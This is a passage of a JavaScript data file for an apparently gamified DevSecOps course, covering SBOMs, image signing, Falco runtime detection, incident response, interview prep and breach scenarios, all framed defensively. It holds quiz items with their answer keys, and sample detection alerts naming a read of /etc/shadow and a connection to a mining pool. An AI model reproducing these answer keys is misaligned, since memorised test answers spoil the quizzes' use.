            { type: 'finding', text: 'Source repo: github.com/org/app (matches expectation)', severity: 'INFO' },
            { type: 'summary', text: 'SLSA Level 3 — provenance verified, artifact integrity confirmed' },
          ]},
        ]},
        { heading: 'Image Signing', blocks: [
          { type: 'text', content: 'Sign container images to verify they have not been tampered with. Cosign (from Sigstore) is the standard tool.' },
          { type: 'pipeline', stages: [
            { label: 'Build', icon: 'Layers', desc: 'Build container image in CI', security: false, tool: 'Docker / Buildah' },
            { label: 'Sign', icon: 'Lock', desc: 'Sign image digest with Cosign', security: true, tool: 'Cosign' },
            { label: 'Push', icon: 'Server', desc: 'Push image + signature to registry', security: false, tool: 'OCI Registry' },
            { label: 'Verify', icon: 'Shield', desc: 'Admission controller verifies signature', security: true, tool: 'Kyverno / Gatekeeper' },
            { label: 'Deploy', icon: 'Check', desc: 'Only signed images allowed to run', security: true, tool: 'Kubernetes' },
          ]},
          { type: 'callout', variant: 'key-concept', title: 'Keyless Signing', content: 'Cosign supports keyless signing via Sigstore. No keys to manage — identity is verified via OIDC (GitHub Actions, Google, etc.) and signatures are stored in a transparency log (Rekor).' },
        ]},
        { heading: 'Dependency Pinning & Reproducible Builds', blocks: [
          { type: 'text', content: 'Pin dependency versions exactly using lock files and hash verification. Reproducible builds ensure the same source always produces the same binary.' },
          { type: 'scan-output', tool: 'trivy', title: 'SBOM Vulnerability Scan', findings: [
            { type: 'header', text: 'trivy sbom sbom.json — nginx:1.25' },
            { type: 'finding', text: 'CVE-2024-0727 openssl 3.0.11 → fix: 3.0.13', severity: 'CRITICAL', file: 'openssl' },
            { type: 'finding', text: 'CVE-2023-44487 nghttp2 1.57.0 → fix: 1.58.0', severity: 'CRITICAL', file: 'nghttp2' },
            { type: 'finding', text: 'CVE-2024-2511 openssl 3.0.11 → fix: 3.0.14', severity: 'HIGH', file: 'openssl' },
            { type: 'summary', text: 'Total: 34 vulnerabilities (3 Critical, 9 High, 14 Medium, 8 Low)' },
          ]},
          { type: 'severity-bars', title: 'SBOM Vulnerability Summary', items: [
            { rank: 1, label: 'Critical', count: 3, color: '#EF4444' },
            { rank: 2, label: 'High', count: 9, color: '#F97316' },
            { rank: 3, label: 'Medium', count: 14, color: '#F59E0B' },
            { rank: 4, label: 'Low', count: 8, color: '#3B82F6' },
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'Secure the Supply Chain',
      scenario: 'Generate an SBOM for a container image, analyze its contents, and scan it for vulnerabilities.',
      files: {
        'supply-chain-lab/': {
          'Dockerfile': 'FROM nginx:1.25\nCOPY index.html /usr/share/nginx/html/\nEXPOSE 80',
        },
      },
      steps: [
        { objective: 'Generate an SBOM with Trivy', command: 'trivy image --format cyclonedx -o sbom.json nginx:1.25', output: 'Generating SBOM in CycloneDX format...\nDetected OS: debian 12.5\nDetected packages: 147\n\n📝 SBOM saved to sbom.json (147 components)', followUp: 'How many components were detected?', answer: '147', hint: 'Check the components count in the output' },
        { objective: 'Scan the SBOM for vulnerabilities', command: 'trivy sbom sbom.json', output: 'Scanning SBOM...\n\nTotal: 34 (LOW: 8, MEDIUM: 14, HIGH: 9, CRITICAL: 3)\n\nCVE-2024-0727   openssl    3.0.11   3.0.13   CRITICAL\nCVE-2023-44487  nghttp2    1.57.0   1.58.0   CRITICAL', followUp: 'How many CRITICAL vulnerabilities were found in the SBOM?', answer: '3', hint: 'Check the CRITICAL count in the Total line' },
        { objective: 'Examine the SBOM structure', command: 'cat sbom.json | python -m json.tool | head -20', output: '{\n  "bomFormat": "CycloneDX",\n  "specVersion": "1.5",\n  "serialNumber": "urn:uuid:abc-123",\n  "version": 1,\n  "metadata": {\n    "timestamp": "2026-03-22T10:00:00Z",\n    "tools": [{"name": "trivy", "version": "0.50.0"}],\n    "component": {\n      "type": "container",\n      "name": "nginx:1.25"\n    }\n  },\n  "components": [\n    {"type": "library", "name": "openssl", "version": "3.0.11"},\n    {"type": "library", "name": "curl", "version": "8.4.0"}\n  ]\n}', followUp: 'What format/spec is this SBOM in?', answer: 'CycloneDX', hint: 'Check the bomFormat field' },
        { objective: 'Generate an SPDX SBOM for comparison', command: 'trivy image --format spdx-json -o sbom-spdx.json nginx:1.25', output: 'Generating SBOM in SPDX format...\n📝 SBOM saved to sbom-spdx.json', followUp: 'What are the two main SBOM formats?', answer: 'CycloneDX and SPDX', hint: 'The two standards are CycloneDX (OWASP) and SPDX (Linux Foundation)' },
      ],
    },
    execute: {
      intro: 'Generate and analyze SBOMs for container images.',
      commands: [
        { cmd: 'trivy image --format cyclonedx -o sbom.json nginx:latest', desc: 'Generate CycloneDX SBOM.' },
        { cmd: 'trivy sbom sbom.json', desc: 'Scan the SBOM for known vulnerabilities.' },
        { cmd: 'trivy image --format spdx-json -o sbom-spdx.json nginx:latest', desc: 'Generate SPDX SBOM for comparison.' },
      ],
    },
    verify: ['How many components are in the SBOM for nginx:latest?', 'What SBOM format did you generate?'],
    quiz: [
      { q: "What is an SBOM?", opts: ["A build tool", "A complete inventory of all components in your software", "A testing framework", "A deployment manifest"], answer: 1, explanation: "A Software Bill of Materials lists every component (direct deps, transitive deps, OS packages) in your software, enabling vulnerability tracking and compliance." },
      { q: "What SLSA level requires signed provenance from a hosted build service?", opts: ["L0", "L1", "L2", "L3"], answer: 2, explanation: "SLSA L2 requires signed provenance (proof of what was built, from what source, by what process) generated by a hosted build service." },
      { q: "Why was the SolarWinds attack so devastating?", opts: ["It exploited a single server", "The backdoor was in the build pipeline, affecting 18,000+ organizations that trusted the update", "It was a DDoS attack", "It only affected one company"], answer: 1, explanation: "Attackers compromised SolarWinds' build pipeline, injecting a backdoor into legitimate software updates distributed to 18,000+ organizations." },
      { q: "What is Cosign used for?", opts: ["Code signing", "Container image signing and verification", "SSH key generation", "SSL certificates"], answer: 1, explanation: "Cosign (part of Sigstore) signs container images so you can verify they haven't been tampered with. Combined with admission controllers, only signed images can deploy." },
      { q: "Why pin dependency versions?", opts: ["It's faster to install", "Prevents unexpected changes from breaking your build or introducing vulnerabilities", "It uses less disk space", "Package managers require it"], answer: 1, explanation: "Pinned versions ensure reproducible builds. Without pinning, a compromised or buggy new version could be silently pulled into your build." },
    ],
  },
  '4.6': {
    id: '4.6', pathId: 4, title: 'Runtime Security & Monitoring', baseXP: 200, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'Shift Right — Runtime Security', blocks: [
          { type: 'text', content: 'Shift Left catches known issues early in development. Shift Right detects unknown threats, zero-days, and anomalous behavior at runtime. You need both.' },
          { type: 'comparison', items: [
            { title: 'Shift Left (Prevention)', color: '#3B82F6', points: ['SAST, SCA, secrets scanning', 'Catches known vulnerability patterns', 'Runs during build/CI', 'Fast feedback to developers'] },
            { title: 'Shift Right (Detection)', color: '#A78BFA', points: ['Runtime monitoring, Falco, SIEM', 'Catches zero-days and novel attacks', 'Runs in production 24/7', 'Alerts security/ops teams'] },
          ]},
        ]},
        { heading: 'Falco — Runtime Threat Detection', blocks: [
          { type: 'callout', variant: 'key-concept', title: 'What is Falco?', content: 'A cloud-native runtime security tool that monitors system calls at the kernel level (via eBPF) to detect anomalous container behavior in real-time.' },
          { type: 'scan-output', tool: 'falco', title: 'Falco Alert Examples', findings: [
            { type: 'finding', severity: 'CRITICAL', text: 'Shell spawned in container (bash in nginx)', file: 'container: web-frontend' },
            { type: 'finding', severity: 'HIGH', text: 'Sensitive file read: /etc/shadow', file: 'container: api-server' },
            { type: 'finding', severity: 'HIGH', text: 'Outbound connection to crypto mining pool', file: 'container: worker-3' },
            { type: 'finding', severity: 'MEDIUM', text: 'Package manager invoked in running container', file: 'container: web-frontend' },
            { type: 'summary', text: 'Falco detects what static scanning cannot — actual runtime behavior that deviates from expected patterns.' },
          ]},
        ]},
        { heading: 'Container Hardening', blocks: [
          { type: 'keyterms', terms: [
            { term: 'Seccomp', definition: 'Restricts which system calls a container can make. Blocks dangerous syscalls like ptrace, mount, and reboot.' },
            { term: 'AppArmor', definition: 'Restricts file access, network access, and capabilities per container. Defines allowed behavior profiles.' },
            { term: 'Read-only FS', definition: 'Mount the container filesystem as read-only. Prevents attackers from writing malware or modifying binaries.' },
            { term: 'Drop Capabilities', definition: 'Remove Linux kernel capabilities the container doesn\'t need. Drop ALL, then add back only what\'s required.' },
          ]},
        ]},
        { heading: 'Security Logging & SIEM', blocks: [
          { type: 'text', content: 'Comprehensive logging is essential for detecting and investigating security incidents.' },
          { type: 'severity-bars', title: 'What to Log for Security', items: [
            { rank: '1', label: 'Authentication events (login/logout/fail)', count: 95, color: '#EF4444' },
            { rank: '2', label: 'Authorization decisions (access denied)', count: 90, color: '#EF4444' },
            { rank: '3', label: 'Privilege changes (sudo, role change)', count: 85, color: '#F97316' },
            { rank: '4', label: 'Network connections (new outbound)', count: 75, color: '#F59E0B' },
            { rank: '5', label: 'File modifications (config changes)', count: 65, color: '#3B82F6' },
            { rank: '6', label: 'API calls (especially admin endpoints)', count: 60, color: '#3B82F6' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Ship logs to a SIEM (Splunk, ELK/OpenSearch, Datadog) and set alerts for anomalous patterns. Logs on the compromised server itself cannot be trusted.' },
        ]},
        { heading: 'Incident Response Framework', blocks: [
          { type: 'attack-flow', steps: [
            { type: 'defense', label: '1. Preparation', detail: 'Runbooks, communication plans, tool access, training. Done BEFORE incidents happen.' },
            { type: 'info', label: '2. Detection & Analysis', detail: 'Alert fires (Falco, SIEM). Triage: is this real? Determine scope and severity.' },
            { type: 'defense', label: '3. Containment', detail: 'Isolate affected systems. Stop the bleeding FIRST. Don\'t investigate while the attacker is still active.' },
            { type: 'defense', label: '4. Eradication', detail: 'Remove the threat: patch the vulnerability, rotate credentials, rebuild compromised containers.' },
            { type: 'info', label: '5. Recovery', detail: 'Restore services from known-good state. Monitor closely for re-compromise.' },
            { type: 'defense', label: '6. Post-Incident (Blameless)', detail: 'What happened? Why? How do we prevent it? Document everything. Focus on systemic fixes, not blame.' },
          ]},
        ]},
        { heading: 'Observability Stack', blocks: [
          { type: 'comparison', items: [
            { title: 'Metrics', color: '#3B82F6', points: ['Prometheus + Grafana', 'CPU, memory, request rates', 'Alertmanager for thresholds'] },
            { title: 'Logs', color: '#22C55E', points: ['Loki, ELK, or Datadog', 'Structured JSON logging', 'Centralized search and correlation'] },
            { title: 'Traces', color: '#A78BFA', points: ['Jaeger or Zipkin', 'Request flow across services', 'Latency bottleneck identification'] },
          ]},
          { type: 'callout', variant: 'warning', content: 'Observability without security context is blind. Combine Prometheus metrics + ELK logs + Falco runtime alerts for a complete picture. Security is not just about finding bugs — it\'s about detecting attackers.' },
        ]},
      ],
    },
    quiz: [
      { q: "What does Falco monitor to detect threats?", opts: ["Source code", "System calls at the kernel level", "DNS queries only", "Git commits"], answer: 1, explanation: "Falco uses kernel-level system call monitoring (via eBPF or kernel module) to detect anomalous container behavior in real-time." },
      { q: "What is Seccomp?", opts: ["A compression tool", "A Linux kernel feature that restricts which system calls a container can make", "A network scanner", "A secrets manager"], answer: 1, explanation: "Seccomp (Secure Computing Mode) filters system calls, preventing containers from using dangerous syscalls like ptrace or mount." },
      { q: "What is the correct order for incident response?", opts: ["Fix → Investigate → Report", "Detect → Contain → Eradicate → Recover → Post-Incident", "Alert → Patch → Forget", "Investigate → Report → Wait"], answer: 1, explanation: "The NIST framework: Preparation → Detection/Analysis → Containment → Eradication → Recovery → Post-Incident Activity. Containment prevents spread." },
      { q: "Why do you need both Shift Left AND Shift Right?", opts: ["Redundancy", "Shift Left catches known issues early; Shift Right detects unknown threats and zero-days at runtime", "They're the same thing", "Management requires both"], answer: 1, explanation: "Shift Left prevents known vulnerability classes. Shift Right detects novel attacks, zero-days, and runtime anomalies that static analysis can't catch." },
      { q: "What is a blameless postmortem?", opts: ["Not doing a review", "An incident review focused on systemic improvements rather than individual blame", "Blaming the newest team member", "A postmortem with no attendees"], answer: 1, explanation: "Blameless postmortems focus on what went wrong systemically and how to prevent recurrence, not on punishing individuals. This encourages honest reporting." },
    ],
  },
  '5.1': {
    id: '5.1', pathId: 5, title: 'Core Interview Questions', baseXP: 100, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'Conceptual Questions (1-5)', blocks: [
          { type: 'keyterms', terms: [
            { term: '1. What is DevSecOps?', definition: 'DevOps with security embedded at every stage. Culture + automation, not just a tool. Security is everyone\'s responsibility.' },
            { term: '2. Explain "Shift Left"', definition: 'Moving security testing earlier (IDE → pre-commit → CI). Finding bugs in design costs 1x; in production costs 100x.' },
            { term: '3. SAST vs DAST vs SCA vs IAST?', definition: 'SAST = static code analysis. DAST = testing running app. SCA = dependency scanning. IAST = instrumented runtime. Each catches different things.' },
            { term: '4. How measure success?', definition: 'MTTR by severity, scan coverage %, false positive rate, developer adoption rate, time-to-fix trends.' },
            { term: '5. What is Policy as Code?', definition: 'Security rules as executable code (OPA/Rego). Version-controlled, testable, automatically enforced in CI/CD.' },
          ]},
        ]},
        { heading: 'Technical Questions (6-10)', blocks: [
          { type: 'keyterms', terms: [
            { term: '6. Design a pipeline', definition: 'Pre-commit (secrets) → CI (SAST, SCA) → Build (image scan) → Staging (DAST) → Policy gate → Prod + runtime monitoring.' },
            { term: '7. Handle critical CVE in prod', definition: 'Assess exploitability → scope blast radius → patch + rebuild → deploy through pipeline → monitor → blameless postmortem.' },
            { term: '8. Choose between tools', definition: 'Evaluate: coverage, false positive rate, language support, CI integration ease, scan speed, cost, community support.' },
            { term: '9. Manage secrets in CI/CD', definition: 'Never in code or env vars. Use Vault/cloud KMS → inject at runtime → short-lived tokens → auto-rotation.' },
            { term: '10. Handle false positives', definition: 'Tune rules, create allowlists, severity-based filtering, track FP rate metric, write custom org-specific rules.' },
          ]},
          { type: 'pipeline', stages: [
            { label: 'Secrets', icon: '🔐', desc: 'Pre-commit', security: true, tool: 'Gitleaks' },
            { label: 'SAST', icon: '🔍', desc: 'Code scan', security: true, tool: 'Semgrep' },
            { label: 'SCA', icon: '📦', desc: 'Deps scan', security: true, tool: 'Trivy' },
            { label: 'Image', icon: '🐳', desc: 'Container scan', security: true, tool: 'Trivy' },
            { label: 'DAST', icon: '🎯', desc: 'Runtime scan', security: true, tool: 'ZAP' },
            { label: 'Gate', icon: '🚦', desc: 'Policy check', security: true, tool: 'OPA' },
            { label: 'Prod', icon: '🚀', desc: 'Deploy + monitor', security: false },
          ]},
        ]},
        { heading: 'Behavioral Questions (11-15)', blocks: [
          { type: 'keyterms', terms: [
            { term: '11. "Security slows us down"', definition: 'Empathize first. Then: fast scans (parallel), IDE plugins (instant feedback), show prevented breaches, only hard-block on critical.' },
            { term: '12. No security culture', definition: 'Start small (secrets detection = low friction). Security champions, lunch-and-learns, gamification, gradual enforcement (warn → block).' },
            { term: '13. Prioritize 500 findings', definition: 'Severity × exploitability × exposure × fix availability. Critical+High internet-facing first. Accept risk on informational.' },
            { term: '14. Security vs deadline', definition: 'Risk assessment, temporary compensating controls (WAF rules), documented exception with fix timeline. Never silently skip.' },
            { term: '15. Staying current', definition: 'NVD/GitHub advisory feeds, security communities (Reddit, Twitter), tool mailing lists, periodic tool reassessment.' },
          ]},
        ]},
        { heading: 'Your Unique Angle', blocks: [
          { type: 'callout', variant: 'key-concept', title: 'The Attacker\'s Perspective', content: '"I approach DevSecOps from an attacker\'s perspective. I know what adversaries look for — exposed secrets, vulnerable dependencies, misconfigured infrastructure — because I\'ve studied and tested for these. My pipelines are designed to catch what I would target as an attacker."' },
          { type: 'callout', variant: 'tip', content: 'This angle differentiates you from candidates who only know the tools. Interviewers want to know you understand WHY each scan matters, not just HOW to run it.' },
        ]},
      ],
    },
    quiz: [
      { q: "What's the best way to explain 'Shift Left' in an interview?", opts: ["Use technical jargon", "Give a concrete example: moving SAST from pre-release review to IDE/pre-commit", "Say it's about moving deployment earlier", "Avoid the topic"], answer: 1, explanation: "Concrete examples are always better. Show how moving scanning from a late-stage review to IDE/pre-commit gives developers immediate feedback and reduces fix costs." },
      { q: "When asked to design a pipeline, what should you start with?", opts: ["The deployment step", "The fastest, cheapest scans (secrets detection) and work toward slower, more comprehensive ones", "DAST scanning", "Manual code review"], answer: 1, explanation: "Start with fast scans (secrets: seconds), then SAST/SCA (minutes), then image scanning, then DAST (minutes to hours). Fast feedback first." },
      { q: "How should you handle the 'security slows us down' objection?", opts: ["Agree and skip security", "Acknowledge the concern, then show how automated, fast scans in CI actually prevent slower incident response later", "Argue that security is more important", "Escalate to management"], answer: 1, explanation: "Empathize first, then reframe: automated scans take minutes; incident response takes days/weeks. Show data on prevented issues." },
      { q: "What metric is most important for DevSecOps maturity?", opts: ["Number of tools deployed", "MTTR (Mean Time to Remediate) by severity", "Number of scans run", "Size of security team"], answer: 1, explanation: "MTTR shows how quickly your organization responds to vulnerabilities. Track by severity: critical CVEs should have MTTR of hours, not weeks." },
      { q: "What makes a strong DevSecOps interview answer?", opts: ["Using as many buzzwords as possible", "Combining technical depth with real-world context and trade-off awareness", "Only talking about tools", "Memorizing definitions"], answer: 1, explanation: "Strong answers show you understand the tools AND the human/process challenges. Mention trade-offs, real incidents, and practical experience." },
    ],
  },
  '5.2': {
    id: '5.2', pathId: 5, title: 'Scenario — Secrets Leaked to GitHub', baseXP: 100, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'The Scenario', blocks: [
          { type: 'callout', variant: 'warning', title: 'Incident Alert', content: 'A developer accidentally pushed AWS access keys to a public GitHub repository. Bots scan GitHub in real-time for credentials. You have minutes, not hours.' },
        ]},
        { heading: 'Step 1: IMMEDIATE (Minutes)', blocks: [
          { type: 'attack-flow', steps: [
            { type: 'defense', label: 'Revoke the exposed AWS credentials NOW', detail: 'Go to AWS IAM console → deactivate/delete the compromised access key. This is your #1 priority.' },
            { type: 'defense', label: 'Generate new credentials', detail: 'Create a new access key pair for legitimate services that need it.' },
            { type: 'defense', label: 'Update dependent systems', detail: 'Any system using the old credentials needs the new ones immediately.' },
          ]},
          { type: 'callout', variant: 'warning', content: 'Do NOT waste time trying to delete the git commit first. Bots scrape GitHub in real-time — they likely captured the key within seconds of your push.' },
        ]},
        { heading: 'Step 2: ASSESS (Hours)', blocks: [
          { type: 'steps', steps: [
            { label: 'Check CloudTrail for unauthorized API calls', detail: 'Filter by the compromised access key ID. Look for any activity you didn\'t initiate.' },
            { label: 'Check for new IAM users/roles/policies', detail: 'Attackers often create backdoor accounts. Check for any IAM changes in the timeframe.' },
            { label: 'Check for running resources', detail: 'Look for new EC2 instances (crypto mining), Lambda functions, S3 access, or data exfiltration.' },
            { label: 'Determine blast radius', detail: 'What IAM permissions did the compromised key have? What could an attacker access?' },
          ]},
        ]},
        { heading: 'Step 3: SCAN (Same Day)', blocks: [
          { type: 'scan-output', tool: 'gitleaks + trufflehog', title: 'Full Repository Scan', findings: [
            { type: 'finding', severity: 'CRITICAL', text: 'AWS Access Key ID (current commit)', file: 'config.py:5' },
            { type: 'finding', severity: 'CRITICAL', text: 'AWS Key found in git history (deleted 2 weeks ago)', file: 'old-config.py (commit a1b2c3)' },
            { type: 'finding', severity: 'HIGH', text: 'Database password in plaintext', file: '.env:8' },
            { type: 'summary', text: 'Scan ALL repos the developer has access to. Check for other embedded secrets across the codebase.' },
          ]},
        ]},
        { heading: 'Step 4: PREVENT (Week)', blocks: [
          { type: 'pipeline', stages: [
            { label: 'Pre-commit', icon: '🔐', desc: 'Gitleaks hooks', security: true, tool: 'Gitleaks' },
            { label: 'CI Scan', icon: '🔍', desc: 'Pipeline scan', security: true, tool: 'TruffleHog' },
            { label: 'Push Protection', icon: '🛡', desc: 'GitHub blocks', security: true, tool: 'GitHub' },
            { label: 'Vault', icon: '🏦', desc: 'Secrets manager', security: true, tool: 'Vault' },
            { label: 'Rotation', icon: '🔄', desc: 'Auto-rotate', security: true },
          ]},
        ]},
        { heading: 'Step 5: PROCESS (Ongoing)', blocks: [
          { type: 'steps', steps: [
            { label: 'Blameless postmortem with the team', detail: 'Focus on systemic failures, not individual blame. What process gap allowed this?' },
            { label: 'Document the incident and response', detail: 'Timeline, actions taken, impact assessment, lessons learned.' },
            { label: 'Create runbook for future secret leaks', detail: 'Step-by-step playbook so the next response is faster.' },
            { label: 'Train team on secrets management', detail: 'Lunch-and-learn on why secrets in code are dangerous, demo the tools.' },
          ]},
        ]},
      ],
    },
    quiz: [
      { q: "What should you do FIRST when credentials are leaked to GitHub?", opts: ["Delete the git commit", "Run a security scan", "Revoke/rotate the credentials immediately", "Notify the manager"], answer: 2, explanation: "Revoke immediately. Bots scrape GitHub in real-time. Deleting the commit doesn't remove it from forks, caches, or the bot that already captured it." },
      { q: "Why shouldn't you try to delete the commit first?", opts: ["It's too slow", "Bots scan GitHub in real-time and may have already captured the credential within seconds", "Git doesn't support it", "It's against policy"], answer: 1, explanation: "Automated bots continuously scrape GitHub for secrets. By the time you delete the commit, the credential may already be compromised." },
      { q: "What should you check in AWS after a key leak?", opts: ["Only S3 buckets", "CloudTrail for unauthorized API calls, new IAM resources, running instances", "Just the billing page", "Nothing, just rotate the keys"], answer: 1, explanation: "Check CloudTrail for any unauthorized activity: new IAM users/roles, running EC2 instances, S3 access, Lambda functions — anything the compromised keys could access." },
      { q: "What is the long-term prevention for secrets in code?", opts: ["Hope developers remember", "Pre-commit hooks + CI scanning + secrets manager + push protection + training", "Only use private repos", "Ban developers from using git"], answer: 1, explanation: "Layer defenses: pre-commit hooks catch secrets before they're committed, CI scanning catches what slips through, secrets managers eliminate the need to put secrets in code, and training builds awareness." },
      { q: "What type of postmortem should you conduct?", opts: ["Blame the developer", "Blameless — focus on systemic improvements, not individual blame", "Skip it", "Only document it"], answer: 1, explanation: "Blameless postmortems focus on systemic failures and prevention. Blaming individuals discourages reporting and doesn't fix the underlying process gaps." },
    ],
  },
  '5.3': {
    id: '5.3', pathId: 5, title: 'Scenario — Critical CVE in Production', baseXP: 100, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'The Scenario', blocks: [
          { type: 'callout', variant: 'warning', title: 'Critical CVE Alert — CVSS 9.8', content: 'A critical RCE vulnerability is announced in a library your production services depend on. Multiple services are affected. Exploit code is already public. The clock is ticking.' },
        ]},
        { heading: 'Step 1: ASSESS (First Hour)', blocks: [
          { type: 'steps', steps: [
            { label: 'Identify all affected services', detail: 'Use your SBOM or run Trivy/Grype against all repos and container images.' },
            { label: 'Determine exploitability', detail: 'Is the vulnerable code path actually reachable in your deployment? Internet-facing = highest priority.' },
            { label: 'Check for a patch', detail: 'Is an updated version available? If yes, assess upgrade difficulty. If no, identify compensating controls.' },
            { label: 'Classify blast radius', detail: 'Map affected services to business criticality. Internet-facing critical services first.' },
          ]},
        ]},
        { heading: 'Step 2: SCOPE (Hours 1-4)', blocks: [
          { type: 'scan-output', tool: 'trivy', title: 'Scanning All Services for CVE-2024-XXXX', findings: [
            { type: 'finding', severity: 'CRITICAL', text: 'CVE-2024-XXXX in libexample 2.3.1 (fix: 2.3.2)', file: 'api-gateway (internet-facing)' },
            { type: 'finding', severity: 'CRITICAL', text: 'CVE-2024-XXXX in libexample 2.3.0 (fix: 2.3.2)', file: 'payment-service (PCI scope)' },
            { type: 'finding', severity: 'CRITICAL', text: 'CVE-2024-XXXX in libexample 2.2.9 (fix: 2.3.2)', file: 'user-service (internal)' },
            { type: 'summary', text: '3 services affected. API gateway and payment service are highest priority (internet-facing + PCI).' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Brief leadership now: "3 services affected, 2 are internet-facing. Patch available. ETA for full remediation: 12 hours."' },
        ]},
        { heading: 'Step 3: FIX (Hours 4-24)', blocks: [
          { type: 'attack-flow', steps: [
            { type: 'defense', label: 'Update dependency to patched version', detail: 'Bump libexample from 2.3.1 to 2.3.2 in all affected services.' },
            { type: 'defense', label: 'Run full test suite', detail: 'Verify no regressions. Do NOT skip this even under time pressure.' },
            { type: 'defense', label: 'Build and scan new container images', detail: 'Rebuild images, then re-scan with Trivy to confirm CVE is gone.' },
            { type: 'defense', label: 'Deploy through normal pipeline', detail: 'Do NOT skip security gates! Internet-facing services first, then internal.' },
          ]},
          { type: 'callout', variant: 'warning', content: 'Never skip security gates to deploy faster. The patch itself could introduce new issues. Your pipeline exists to catch problems — use it.' },
        ]},
        { heading: 'Step 4: VERIFY (Day 2)', blocks: [
          { type: 'steps', steps: [
            { label: 'Confirm all services are patched', detail: 'Re-scan every image and repo. The CVE should no longer appear in any scan.' },
            { label: 'Check for exploitation attempts', detail: 'Review runtime logs (Falco, WAF, SIEM) for any exploitation during the vulnerability window.' },
            { label: 'Update SBOM records', detail: 'Regenerate SBOMs to reflect the new dependency versions.' },
          ]},
        ]},
        { heading: 'Step 5: IMPROVE (Week)', blocks: [
          { type: 'severity-bars', title: 'Postmortem Metrics to Track', items: [
            { rank: '⏱', label: 'Time to detect (how fast did we learn about the CVE?)', count: 85, color: '#3B82F6' },
            { rank: '🔧', label: 'Time to remediate (MTTR from detection to deployed fix)', count: 100, color: '#EF4444' },
            { rank: '📊', label: 'Scan coverage (% of services with SCA scanning)', count: 70, color: '#F59E0B' },
            { rank: '🤖', label: 'Automation gap (could earlier scanning have caught this?)', count: 60, color: '#A78BFA' },
          ]},
        ]},
      ],
    },
    quiz: [
      { q: "What should you assess first with a critical CVE?", opts: ["How to upgrade all dependencies", "Which services are affected and whether the vulnerability is exploitable in your deployment", "Whether to shut down production", "Who introduced the dependency"], answer: 1, explanation: "First determine scope: which services use the vulnerable library, are they internet-facing, is the vuln exploitable in your specific configuration? This guides priority." },
      { q: "Should you skip security gates to deploy the fix faster?", opts: ["Yes, speed is everything", "No — deploy through the normal pipeline; skipping gates could introduce new problems", "Only for critical fixes", "It depends on the manager"], answer: 1, explanation: "Never skip security gates, even for urgent fixes. The fix itself could introduce new issues. Your pipeline exists to catch problems — use it." },
      { q: "What tool helps identify all affected services?", opts: ["A spreadsheet", "SBOM (Software Bill of Materials) and dependency scanning tools like Trivy/Grype", "Only manual code review", "Asking developers"], answer: 1, explanation: "SBOMs provide a complete inventory of all components. Trivy/Grype can scan all images and codebases to quickly identify where the vulnerable dependency exists." },
      { q: "What is MTTR and why does it matter for CVE response?", opts: ["Mean Time To Report", "Mean Time to Remediate — measures how quickly you fix vulnerabilities from discovery to deployment", "Mean Time To Restart", "Maximum Threshold for Testing Risk"], answer: 1, explanation: "MTTR measures the time from vulnerability discovery to deployed fix. For critical CVEs, target hours not days. Track this metric to improve over time." },
      { q: "After patching, what should you check?", opts: ["Only that the service starts", "Re-scan to confirm CVE is resolved, check for exploitation during the window, update SBOMs", "Nothing, the fix is deployed", "Only check the next day"], answer: 1, explanation: "Verify the fix (re-scan), check for exploitation during the vulnerability window (runtime logs), and update SBOMs to reflect the new component versions." },
    ],
  },
  '5.4': {
    id: '5.4', pathId: 5, title: 'Scenario — DevSecOps from Zero', baseXP: 100, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'The Scenario', blocks: [
          { type: 'callout', variant: 'example', title: 'Your Mission', content: 'You\'re hired to implement DevSecOps at a company that has never done it. 50 developers, 20 microservices, no security scanning, secrets in config files, manual deployments. Where do you start?' },
        ]},
        { heading: 'Month 1: Quick Wins', blocks: [
          { type: 'steps', steps: [
            { label: 'Install pre-commit hooks with Gitleaks', detail: 'Blocks secrets before they enter git. Zero impact on CI speed. Highest ROI first action.' },
            { label: 'Add Trivy container scanning to CI', detail: 'Catches vulnerable base images. Quick to set up, immediate visibility.' },
            { label: 'Audit and rotate known exposed secrets', detail: 'Check git history, config files, env vars. Rotate everything found.' },
            { label: 'Create #security Slack channel', detail: 'Awareness and culture building starts with visibility and communication.' },
            { label: 'Identify 2-3 Security Champions', detail: 'Find developers who are interested in security. They\'ll be your force multipliers.' },
          ]},
        ]},
        { heading: 'Month 2: Foundation', blocks: [
          { type: 'steps', steps: [
            { label: 'Add Semgrep SAST to all CI pipelines', detail: 'Start with --config auto (warnings only, don\'t block). Let teams see findings.' },
            { label: 'Set up Vault — migrate top 5 secrets', detail: 'Don\'t try to migrate everything at once. Start with the highest-risk credentials.' },
            { label: 'Establish severity SLAs', detail: 'Critical = 24h, High = 7 days, Medium = 30 days. Written policy, leadership-approved.' },
            { label: 'OWASP Top 10 lunch-and-learn', detail: 'Make it interactive. Show real examples from your own codebase if possible.' },
            { label: 'Start tracking metrics', detail: 'Scan coverage %, open vulns by severity, MTTR. You can\'t improve what you don\'t measure.' },
          ]},
        ]},
        { heading: 'Month 3-4: Maturity', blocks: [
          { type: 'pipeline', stages: [
            { label: 'Secrets', icon: '🔐', desc: 'Pre-commit', security: true, tool: 'Gitleaks' },
            { label: 'SAST', icon: '🔍', desc: 'Code scan', security: true, tool: 'Semgrep' },
            { label: 'SCA', icon: '📦', desc: 'Deps scan', security: true, tool: 'Trivy' },
            { label: 'Image', icon: '🐳', desc: 'Container', security: true, tool: 'Trivy' },
            { label: 'IaC', icon: '📋', desc: 'Infra scan', security: true, tool: 'Checkov' },
            { label: 'DAST', icon: '🎯', desc: 'Staging', security: true, tool: 'ZAP' },
            { label: 'Gate', icon: '🚦', desc: 'Block critical', security: true },
          ]},
          { type: 'callout', variant: 'tip', content: 'This is when you switch from warnings to soft blocks. Block PRs with CRITICAL findings only. Keep HIGH as warnings. This gives teams time to adapt without creating frustration.' },
        ]},
        { heading: 'Month 5-6: Advanced', blocks: [
          { type: 'comparison', items: [
            { title: 'Code Quality', color: '#3B82F6', points: ['SonarQube for historical tracking', 'Quality gates on new code', 'Technical debt visibility'] },
